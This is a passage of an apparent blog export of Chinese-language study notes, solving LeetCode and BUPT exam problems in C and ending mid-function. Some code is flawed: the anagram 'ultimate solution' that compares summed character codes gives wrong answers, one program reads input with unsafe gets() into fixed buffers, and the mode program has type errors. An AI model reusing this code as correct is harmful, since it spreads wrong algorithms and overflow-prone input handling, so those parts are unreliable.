    <content><![CDATA[<h4 id="Valid-Anagram"><a href="#Valid-Anagram" class="headerlink" title="Valid Anagram"></a>Valid Anagram</h4><p>LeetCode第242题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given two strings s and t, write a function to determine if t is an anagram of s.</p>
<a id="more"></a>
<p>For example,<br>s = “anagram”, t = “nagaram”, return true.<br>s = “rat”, t = “car”, return false.</p>
<p>Note:<br>You may assume the string contains only lowercase alphabets.</p>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>先将两个字符串按字母大小排序，再从头开始比较每一个字符，如果全相等则是，否则不是。这个方法可以得到结果，但是效率太低，字符串很长时会造成超时。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> true 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> false 0</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">sort</span><span class="params">(<span class="keyword">char</span> *s,<span class="keyword">int</span> len)</span> <span class="comment">//简单选择排序</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i,j,min,temp;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len<span class="number">-1</span>;i++)</div><div class="line">    &#123;</div><div class="line">        min = i;</div><div class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;len;j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(s[j]&lt;s[min])</div><div class="line">                min = j;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(min!=i)</div><div class="line">        &#123;</div><div class="line">            temp = s[i];</div><div class="line">            s[i] = s[min];</div><div class="line">            s[min] = temp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> s;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAnagram</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">char</span>* t)</span> </span>&#123;   <span class="comment">//判断字符串是否相等</span></div><div class="line">    <span class="keyword">int</span> len1,len2,i;</div><div class="line">    len1 = <span class="built_in">strlen</span>(s);</div><div class="line">    len2 = <span class="built_in">strlen</span>(t);</div><div class="line">    <span class="keyword">if</span>(len1 == len2)</div><div class="line">    &#123;</div><div class="line">        s = sort(s,len1);</div><div class="line">        t = sort(t,len2);</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len1;i++)     <span class="comment">//从第一个字符开始按顺序判断每个字符是否相等</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(s[i] == t[i])</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            <span class="keyword">else</span></div><div class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(i==len1)     <span class="comment">//如果全相等，则返回真</span></div><div class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> s[<span class="number">100</span>],t[<span class="number">100</span>];</div><div class="line"></div><div class="line">    gets(s);    <span class="comment">//输入两个字符串</span></div><div class="line">    gets(t);</div><div class="line">    <span class="keyword">if</span>(isAnagram(s,t))</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"YES!\n"</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"NO!\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="更好的解法"><a href="#更好的解法" class="headerlink" title="更好的解法"></a>更好的解法</h5><p>26个字母，用一个数组来记录每个字母出现的次数，如果某个字母在第一个数组出现，它第二个数组中出现时则计数减一，最好判断计数数组是否全为0。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">char</span>* t)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> scnt = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> tcnt = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">int</span> histogram[<span class="number">26</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</div><div class="line">                         <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</div><div class="line">                         <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;  <span class="comment">//初始化记录数组</span></div><div class="line"></div><div class="line">    <span class="keyword">while</span>(s[scnt] != <span class="string">'\0'</span>)&#123;</div><div class="line">        histogram[s[scnt] - <span class="number">97</span>]++;  <span class="comment">//对应记录值加一</span></div><div class="line">        scnt++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(t[tcnt] != <span class="string">'\0'</span>)&#123;</div><div class="line">        histogram[t[tcnt] - <span class="number">97</span>]--;  <span class="comment">//对应记录值减一</span></div><div class="line">        tcnt++;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(scnt != tcnt) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(scnt == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">26</span> ; i++)</div><div class="line">            <span class="keyword">if</span>(histogram[i] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;     <span class="comment">//判断所有记录值是不是都为0</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="终极解决办法"><a href="#终极解决办法" class="headerlink" title="终极解决办法"></a>终极解决办法</h5><p>从两个字符串第一个字符开始，依次记录两个字符串的对应字符的ASCLL码的差值，如果最后得到的记录值为0，则说明两个字符串中含有的字符完全相同，否则不相同。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isAnagram</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">char</span>* t)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(s)!=<span class="built_in">strlen</span>(t))    <span class="comment">//如果字符串长度不相等则无须比较</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"><span class="comment">//按顺序遍历两个字符串，用total来记录两个字符串中字符的ascll码值差值，如果最后差值等与0，则可判断为字符相等，否则不想等。</span></div><div class="line">    <span class="keyword">while</span>((*s)!=<span class="string">'\0'</span>)   </div><div class="line">    &#123;</div><div class="line">        total += (*s-*t);</div><div class="line">        s++;</div><div class="line">        t++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(total==<span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="超简洁的python实现"><a href="#超简洁的python实现" class="headerlink" title="超简洁的python实现"></a>超简洁的python实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">return</span> sorted(s) == sorted(t)</div></pre></td></tr></table></figure>
<h4 id="Add-Digits"><a href="#Add-Digits" class="headerlink" title="Add Digits"></a>Add Digits</h4><p>LeetCode第258题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given a non-negative integer num, repeatedly add all its digits until the result has only one digit.</p>
<p>For example:</p>
<p>Given num = 38, the process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one digit, return it.</p>
<p>Follow up:</p>
<p>Could you do it without any loop/recursion in O(1) runtime?     //这个要求好像没达到，但是还是AC了</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>对取余得到数的各个位的数值，然后加起来，得到一个新的数，判断这个新的数是否还可以进行上述步骤，即判断该数是否大于10，如果大于10则递归执行上述操作，否则该数即为我们需要的结果。</p>
<h5 id="LeetCode-AC的代码"><a href="#LeetCode-AC的代码" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">addDigits</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(num)&#123;     <span class="comment">//求各个位的值的和</span></div><div class="line">        sum = sum + num%<span class="number">10</span>;</div><div class="line">        num = num/<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(sum&gt;=<span class="number">10</span>)</div><div class="line">        <span class="keyword">return</span> addDigits(sum);  <span class="comment">//递归执行</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> sum;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Two-Sum"><a href="#Two-Sum" class="headerlink" title="Two Sum"></a>Two Sum</h4><p>LeetCode第1题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given an array of integers, return indices of the two numbers such that they add up to a specific target.</p>
<p>You may assume that each input would have exactly one solution.</p>
<p>Example:</p>
<p>Given nums = [2, 7, 11, 15], target = 9,</p>
<p>Because nums[0] + nums[1] = 2 + 7 = 9,<br>return [0, 1].</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>给了一个数组，然后给一个目标数，找出目标数是由数组中哪两个数相加得到的，输出那两个数的下标。我们只要从第一个数开始将每个数与后面的数依次相加并判断相加的结果是否等于目标数</p>
<p>一定要注意代码编辑部分的提示，返回的数组必须自己使用malloc分配内存，否则即使你做对了也一直无法AC，这就是我的惨痛教训！</p>
<h5 id="LeetCode-AC的代码-1"><a href="#LeetCode-AC的代码-1" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"> * Note: The returned array must be malloced, assume caller calls free().</div><div class="line"> */</div><div class="line"><span class="function"><span class="keyword">int</span>* <span class="title">twoSum</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize, <span class="keyword">int</span> target)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j,*res;</div><div class="line">    res = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2</span>);</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;numsSize<span class="number">-1</span>;i++)   <span class="comment">//从第一个数开始将每个数与后面的数依次相加</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;numsSize;j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(nums[i] + nums[j] == target)     <span class="comment">//判断相加的结果是否等于目标数</span></div><div class="line">            &#123;</div><div class="line">                res[<span class="number">0</span>] = i;</div><div class="line">                res[<span class="number">1</span>] = j;</div><div class="line">                <span class="keyword">return</span> res;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> res;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Palindrome-Number"><a href="#Palindrome-Number" class="headerlink" title="Palindrome Number"></a>Palindrome Number</h4><p>LeetCode第9题</p>
<h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>Determine whether an integer is a palindrome. Do this without extra space.</p>
<h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>“回文”是指正读反读都能读通的句子，在数学中也有这样一类数字有这样的特征，成为回文数（palindrome number）</p>
<p>判断一个数是不是回文数，只要回文数是否与其倒置后的数相等</p>
<p>例如：</p>
<p>123倒置后为321，不是回文数</p>
<p>12344321倒置后仍为12344321，即为回文数</p>
<h5 id="LeetCode-AC的代码-2"><a href="#LeetCode-AC的代码-2" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> mod,inverse=<span class="number">0</span>,num;</div><div class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>)     <span class="comment">//负数必定不是回文数</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    num = x;</div><div class="line">    <span class="keyword">while</span>(num)  <span class="comment">//把数倒置</span></div><div class="line">    &#123;</div><div class="line">        mod = num%<span class="number">10</span>;</div><div class="line">        inverse = inverse*<span class="number">10</span> + mod;</div><div class="line">        num = num/<span class="number">10</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(inverse==x)  <span class="comment">//判断原数与倒置后的数是否相等</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Excel-Sheet-Column-Title"><a href="#Excel-Sheet-Column-Title" class="headerlink" title="Excel Sheet Column Title"></a>Excel Sheet Column Title</h4><p>LeetCode第168题</p>
<h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given a positive integer, return its corresponding column title as appear in an Excel sheet.</p>
<p>For example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">1 -&gt; A</div><div class="line">2 -&gt; B</div><div class="line">3 -&gt; C</div><div class="line">...</div><div class="line">26 -&gt; Z</div><div class="line">27 -&gt; AA</div><div class="line">28 -&gt; AB</div></pre></td></tr></table></figure>
<h5 id="LeetCode-AC的代码-3"><a href="#LeetCode-AC的代码-3" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">convertToTitle</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i=<span class="number">0</span>,j;</div><div class="line">    <span class="keyword">char</span> *s,temp;</div><div class="line">    s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">100</span>);</div><div class="line">    <span class="keyword">while</span>(n)</div><div class="line">    &#123;</div><div class="line">        s[i] = (<span class="keyword">char</span>)((n<span class="number">-1</span>)%<span class="number">26</span>+<span class="number">65</span>);</div><div class="line">        n = (n<span class="number">-1</span>)/<span class="number">26</span>;</div><div class="line">        i++;</div><div class="line">    &#125;</div><div class="line">    s[i]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(i&gt;<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i/<span class="number">2</span>;j++)</div><div class="line">        &#123;</div><div class="line">            temp = s[j];</div><div class="line">            s[j] = s[i<span class="number">-1</span>-j];</div><div class="line">            s[i<span class="number">-1</span>-j] = temp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> s;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Exercise</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
        <tag>算法学习</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(五)</title>
    <url>/2016/08/18/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%BA%94/</url>
    <content><![CDATA[<h4 id="Move-Zeroes"><a href="#Move-Zeroes" class="headerlink" title="Move Zeroes"></a>Move Zeroes</h4><p>LeetCode第283题</p>
<h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>Given an array nums, write a function to move all 0’s to the end of it while maintaining the relative order of the non-zero elements.</p>
<a id="more"></a>
<p>For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].</p>
<p>Note:</p>
<p>1、You must do this in-place without making a copy of the array.</p>
<p>2、Minimize the total number of operations.</p>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>题目要求把数组中的0移到数组后面去，主要是需要考虑全0、前面几个连续的0、已经是只有后面有0的情况，一开始抓着0来做，后来发现找非0的数会更方便一点，将非0的数依次前移，然后将后面的空位全部补0就可以完成任务了。</p>
<h5 id="LeetCode-AC的代码"><a href="#LeetCode-AC的代码" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsSize)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j,m=<span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;numsSize;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(nums[i] != <span class="number">0</span>)</div><div class="line">            nums[m++] = nums[i];    <span class="comment">//将不为0的数前移</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(j=m;j&lt;numsSize;j++)     <span class="comment">//将后面空出的位置补0</span></div><div class="line">    &#123;</div><div class="line">        nums[j] = <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Problem-A-众数"><a href="#Problem-A-众数" class="headerlink" title="Problem A. 众数"></a>Problem A. 众数</h4><p>北邮2014年研究生复试机试题</p>
<h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>给定一个长度为N的非降数列，求数列中出现次数最多的数。如果答案不唯一，输出其中最小的数。</p>
<p>输入格式</p>
<p>输入数据第一行是一个整数T(1&lt;=T&lt;=100)，表示测试数据的组数。注意各组测试数据是相互独立的。  </p>
<p>对于每组测试数据：</p>
<p>第一行是一个正整数N（1&lt;=N&lt;=100），表示数列长度。  </p>
<p>第二行有N个正整数，整数之间用空格隔开，所有的整数都不超过10的5次方 ，表示这个数列。</p>
<p>输出格式  </p>
<p>对于每组测试数据，输出一个整数。  </p>
<p>输入样例  </p>
<p>2</p>
<p>4  </p>
<p>1 1 1 2</p>
<p>5</p>
<p>1 1 2 2 3  </p>
<p>输出样例</p>
<p>1</p>
<p>1</p>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>对输入序列进行排序，然后从头开始统计相同整数的个数，将个数最多的整数输出即可。</p>
<h5 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">char</span>* <span class="title">sort</span><span class="params">(<span class="keyword">int</span> *s,<span class="keyword">int</span> len)</span></span>&#123;     <span class="comment">//简单选择排序</span></div><div class="line">    <span class="keyword">int</span> i,j,min,temp;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len<span class="number">-1</span>;i++)</div><div class="line">    &#123;</div><div class="line">        min = i;</div><div class="line">        <span class="keyword">for</span>(j=i+<span class="number">1</span>;j&lt;len;j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(s[j]&lt;s[min])</div><div class="line">                min = j;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(min!=i)</div><div class="line">        &#123;</div><div class="line">            temp = s[i];</div><div class="line">            s[i] = s[min];</div><div class="line">            s[min] = temp;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> s;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n,m,i,j,*num,count,k,result;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">while</span>(n--)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;m);</div><div class="line">        num = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*m);</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;num[i]);</div><div class="line">        num = sort(num,m);  <span class="comment">//对输入序列进行排序</span></div><div class="line">        count=<span class="number">0</span>;</div><div class="line">        k=<span class="number">1</span>;</div><div class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m<span class="number">-1</span>;i++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span>(num[i] == num[i+<span class="number">1</span>])&#123;     </div><div class="line">                k++;    <span class="comment">//如果连续的数相等，则计数加1</span></div><div class="line">            &#125;<span class="keyword">else</span>&#123;</div><div class="line">                k=<span class="number">1</span>;    <span class="comment">//如果连续的数不相等，则计数清空</span></div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span>(count&lt;k)     <span class="comment">//如果此时的统计个数大于之前的记录值则当前为最大值</span></div><div class="line">            &#123;</div><div class="line">                count = k;  <span class="comment">//统计个数最多的数</span></div><div class="line">                result = num[i];    <span class="comment">//记录个数最多的数的值</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,result);  </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Ugly-Number"><a href="#Ugly-Number" class="headerlink" title="Ugly Number"></a>Ugly Number</h4><p>LeetCode第263题</p>
<h5 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h5><p>Write a program to check whether a given number is an ugly number.</p>
<p>Ugly numbers are positive numbers whose prime factors only include 2, 3, 5. For example, 6, 8 are ugly while 14 is not ugly since it includes another prime factor 7.</p>
<p>Note that 1 is typically treated as an ugly number.</p>
<h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>把只包含因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含因子7。习惯上我们把1当做是第一个丑数。</p>
<p>所谓一个数m是另一个数n的因子，是指n能被m整除，也就是n % m == 0。根据丑数的定义，丑数只能被2、3和5整除。也就是说如果一个数如果它能被2整除，我们把它连续除以2；如果能被3整除，就连续除以3；如果能被5整除，就除以连续5。如果最后我们得到的是1，那么这个数就是丑数，否则不是。</p>
<h5 id="LeetCode-AC的代码-1"><a href="#LeetCode-AC的代码-1" class="headerlink" title="LeetCode AC的代码"></a>LeetCode AC的代码</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isUgly</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(num&lt;=<span class="number">0</span>)</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">while</span>(num%<span class="number">2</span>==<span class="number">0</span>)     <span class="comment">//连续除以2</span></div><div class="line">        num /= <span class="number">2</span>;</div><div class="line">    <span class="keyword">while</span>(num%<span class="number">3</span>==<span class="number">0</span>)     <span class="comment">//连续除以3</span></div><div class="line">        num /= <span class="number">3</span>;</div><div class="line">    <span class="keyword">while</span>(num%<span class="number">5</span>==<span class="number">0</span>)     <span class="comment">//连续除以5</span></div><div class="line">        num /= <span class="number">5</span>;</div><div class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)    <span class="comment">//如果最后得到1，则证明只能被2，3，5整除，即为丑数</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Problem-B-旋转图像"><a href="#Problem-B-旋转图像" class="headerlink" title="Problem B. 旋转图像"></a>Problem B. 旋转图像</h4><p>北邮2014年研究生复试机试题</p>
<h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>在图形学中，我们经常需要对具体的图像进行一些处理。在这个问题中，你的任务是将一幅只包含01像素点的图片进行顺时针旋转。旋转的角度仅包含0度，90度，180度，270度。</p>
<p>输入格式</p>
<p>输入的第一行是一个整数T（T&lt;=50），表示输入的数据组数。</p>
<p>每组测试数据的第一行是两个整数N和M，（1&lt;=N,M&lt;=50），表示图片的高度和宽度。</p>
<p>接下来N行，每行是一个长度为M的01串，表示图片的像素点。 最后一行是一个整数angle，表示旋转的角度。</p>
<p>输出格式</p>
<p>对于每组测试数据，输出旋转后得到的图片。请注意不要输出多余的空格或空行。  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">输入样例</div><div class="line">2</div><div class="line">2 3</div><div class="line">111</div><div class="line">000</div><div class="line">90</div><div class="line">3 3</div><div class="line">111</div><div class="line">101</div><div class="line">111</div><div class="line">180</div><div class="line"></div><div class="line">输出样例</div><div class="line">01</div><div class="line">01</div><div class="line">01</div><div class="line">111</div><div class="line">101</div><div class="line">111</div></pre></td></tr></table></figure>
<h5 id="思路分析-3"><a href="#思路分析-3" class="headerlink" title="思路分析"></a>思路分析</h5><p>此题的关键在于选择合适的存储方式，因为题目中图片有宽高，输入的情况类似于一个矩阵，因此可采用二维数组来存储输入的字符，然后根据旋转角度分情况将字符数组按要求输出即可。</p>
<h5 id="C语言实现-1"><a href="#C语言实现-1" class="headerlink" title="C语言实现"></a>C语言实现</h5><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate0</span><span class="params">(<span class="keyword">char</span>** s,<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,s[i]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate90</span><span class="params">(<span class="keyword">char</span>** s,<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;m;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j=n<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%c"</span>,s[j][i]);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate180</span><span class="params">(<span class="keyword">char</span>** s,<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span>(i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)</div><div 